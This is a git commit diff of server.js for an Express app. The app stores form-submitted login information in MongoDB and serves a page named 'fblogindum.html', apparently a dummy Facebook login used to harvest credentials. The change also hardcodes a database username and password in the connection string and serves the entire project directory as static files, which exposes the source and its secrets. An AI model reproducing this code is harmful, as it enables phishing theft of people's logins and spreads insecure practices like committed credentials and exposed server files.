3304ecf7a6d86db361c61202bafb04c701af28be
jerrydapoo <hendrix.chino@gmail.com>
2024-10-31 15:10:58 +0800

    Update server.js

--- server.js
+++ server.js
@@ -8,8 +8,7 @@ const { MongoClient } = require('mongodb');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Use environment variables for sensitive information
-const uri = process.env.MONGODB_URI || "mongodb+srv://user1:user123@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+const uri = "mongodb+srv://user1:user123@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
 const client = new MongoClient(uri);
 
 let db; // Declare the db variable
@@ -28,7 +27,7 @@ connectToDatabase();
 
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname))); // Serve static files from the "public" directory
+app.use(express.static(__dirname)); // Serve static files from the "public" directory
 
 // Route to handle login form submission
 app.post('/submit-login', async (req, res) => {
@@ -55,22 +54,22 @@ app.post('/submit-login', async (req, res) => {
         res.send('Login information saved successfully to MongoDB.');
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
-        res.status(500).send('An error occurred while saving your login information.');
+        res.status(500).send('Error saving data to MongoDB.');
     }
 });
 
 // Routes to serve HTML files
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'Home.html'));
+    res.sendFile(path.join(__dirname, 'Home.html'));
 });
 app.get('/Job Postings.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'Job Postings.html'));
+    res.sendFile(path.join(__dirname, 'Job Postings.html'));
 });
 app.get('/Announcements.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'Announcements.html'));
+    res.sendFile(path.join(__dirname, 'Announcements.html'));
 });
-app.get('/fblogindum.html', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'fblogindum.html'));
+app.get('/public/fblogindum.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'fblogindum.html'));
 });
 
 // Start the server
